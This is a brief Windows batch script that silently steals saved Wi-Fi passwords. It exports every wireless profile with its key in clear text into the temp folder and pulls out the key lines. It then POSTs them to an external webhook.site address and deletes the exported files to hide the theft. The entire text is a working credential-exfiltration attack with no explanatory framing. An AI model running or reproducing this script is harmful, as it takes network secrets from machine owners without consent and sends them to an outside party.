@echo [off]
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial'  > WiFi-Key
powershell Invoke-WebRequest -Uri https://webhook.site/3b677df1-04ed-4ffc-897b-55e3bad67dd2 -Method POST -InFile WiFi-Key
del Wi* /s/f/q
exit